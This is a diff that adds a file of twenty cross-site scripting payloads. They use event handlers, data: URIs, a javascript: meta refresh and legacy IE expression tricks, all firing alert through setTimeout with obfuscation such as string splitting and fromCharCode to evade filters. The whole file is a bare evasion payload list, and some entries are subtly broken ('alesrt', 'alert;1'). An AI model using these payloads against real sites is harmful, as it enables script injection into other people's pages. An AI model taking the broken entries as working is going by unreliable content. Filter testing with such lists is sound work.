@@ -1,0 +1,20 @@
+<embed src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><g onload=setTimeout(unescape('%61%6c%65%72%74%28%32%29'),100)></g></svg>"></embed>
+<img src='x' onerror="setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),100)">
+<body onpageshow=setTimeout('ale'+'rt(1)',100)>
+<marquee loop=1 onfinish=setTimeout(Function('ale'+'rt(1)'),100)></marquee>
+<button autofocus onfocus=setTimeout('ale'+'rt(1)',100)>Click</button>
+<input type="text" autofocus onblur=setTimeout(`al\ert(1)`,100)>
+<form onreset="setTimeout('ale\\u0072t(1)', 100)"><input type=reset></form>
+<textarea autofocus onfocusout=`setTimeout(\`alesrt(1)\`,100)`></textarea>
+<select onchange="this.setAttribute('onchange', 'setTimeout(\'aler\' + \'t(1)\', 100)')">
+<object data="data:text/html,<body onload=setTimeout(&#39;ale&#39;+&#39;rt(1)&#39;,100)></body>"></object>
+<keygen autofocus onfocus=setTimeout("ale"+"rt(1)",100)>
+<div style="width:expression(setTimeout('al'+'ert(1)',100))">Test</div>
+<audio src=x onerror=setTimeout('ale'+'rt(1)',100)></audio>
+<SCRIPT FOR=document EVENT=onreadystatechange deFER>setTimeout('ale'+'rt(1)',100)</SCRIPT>
+<video><source onerror=setTimeout(`alert;1`,100)></source></video>
+<meta http-equiv="refresh" content="0;url=javascript:window.setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),100)">
+<xmp style="behavior:url(#default#AnchorClick);" onclick="setTimeout('al'+'ert(1)',100)">Click</xmp>
+<fieldset oninput="setTimeout('ale'+'rt(1)',100)"><input autofocus></fieldset>
+<isindex action=javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+<svg><desc onload=setTimeout(()=>{al\ert(1)},100)></desc></svg>
